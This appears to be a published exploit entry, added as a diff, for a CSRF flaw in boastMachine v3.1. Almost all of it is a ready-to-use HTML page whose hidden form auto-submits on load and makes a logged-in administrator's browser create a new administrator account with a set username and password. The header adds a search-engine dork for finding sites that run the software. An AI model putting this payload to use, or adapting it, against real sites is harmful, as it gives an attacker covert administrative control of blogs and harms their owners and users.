@@ -1,0 +1,32 @@
+# Exploit Title: boastMachine v3.1 <= CSRF Add Admin Vulnerability
+# Date: 28/3/2012
+# Author: Dr.NaNo
+# Software Link: http://boastology.com/pages/dload.php?id=bmachine-3.1.zip
+# Version: 3.1
+# Tested on: Linux-Red-Hat
+# Google Dork: Powered by boastMachine v3.1
+#
+########################################################
+#                     ~ Exploit ~                      #   
+########################################################
+
+<html>
+<form  name="nano" action="http://localhost/{PACH}/bmc/admin.php?action=add_user&blog" method="post">
+<input type="hidden" name="action" value="add_user"><br/>
+<input type="hidden" name="do" value="add"><br/>
+<input type="hidden" value="NANO" name="user_login"><br/>
+<input type="hidden" value="NANO1234" name="user_pass"><br/>
+<input type="hidden" value="Administrator" name="user_name"><br/>
+<input type="hidden" value="security@wsecurity.com" name="user_email"><br/>
+<input type="hidden" value="4" name="blogs[]"><br/>
+<input type="hidden" value="4" name="user_level"><br/>
+<input type="hidden" value="Add"><br/>
+</form>
+<script>document.nano.submit();</script>
+</html>
+
+########################################################
+#                                                      #
+# ~ Greetz : Dr.WEP , JIKO , ( All FriendS ) ~          #
+#                                                      #
+########################################################
